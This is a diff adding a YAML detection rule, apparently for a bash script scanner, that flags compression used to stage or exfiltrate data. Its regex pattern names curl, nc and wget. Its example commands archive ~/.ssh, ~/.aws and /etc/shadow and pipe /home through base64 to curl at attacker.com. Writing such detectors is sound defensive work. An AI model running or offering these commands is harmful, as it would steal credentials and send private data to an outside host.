@@ -1,0 +1,42 @@
+# Bash Pattern: Suspicious File Compression
+# Detects suspicious file compression for staging or exfiltration
+
+id: BASH-018
+name: Suspicious File Compression
+description: |
+  Detects suspicious file compression with password protection or piped to network.
+  Simple backup compression (tar /home, tar /etc) is common for legitimate backups.
+  Pattern focuses on password-protected archives (-P, -p, -hp flags) or compression
+  piped directly to network tools which indicates exfiltration intent.
+languages:
+  - bash
+detection_type: regex
+# Focus on password-protected archives or compression piped to network
+# Simple tar/zip of directories is common for legitimate backups
+detection_logic: 'zip\b[^\n]*-(?:e|P)\s+|7z\b[^\n]*-p\s*\S|rar\b[^\n]*-hp|tar\b[^\n]*\|[^\n]*(?:curl|nc|wget|base64\s*\|)'
+severity: Medium
+mitre_technique: T1560.001
+confidence: 0.8
+category: collection
+enabled: true
+paranoia_levels:
+  - 1
+  - 2
+  - 3
+metadata:
+  author: Script Sentinel Team
+  created: "2025-11-17"
+  updated: "2025-11-17"
+  references:
+    - "https://attack.mitre.org/techniques/T1560/001/"
+    - "https://attack.mitre.org/techniques/T1560/"
+  tags:
+    - bash
+    - compression
+    - data-staging
+    - exfiltration
+  examples:
+    - "tar czf /tmp/data.tar.gz /etc /home 2>/dev/null"
+    - "zip -e -P password /tmp/secrets.zip ~/.ssh/* ~/.aws/*"
+    - "7z a -pSecretPass /tmp/archive.7z /root /etc/shadow"
+    - "tar cf - /home | gzip | base64 | curl -d @- http://attacker.com/upload"
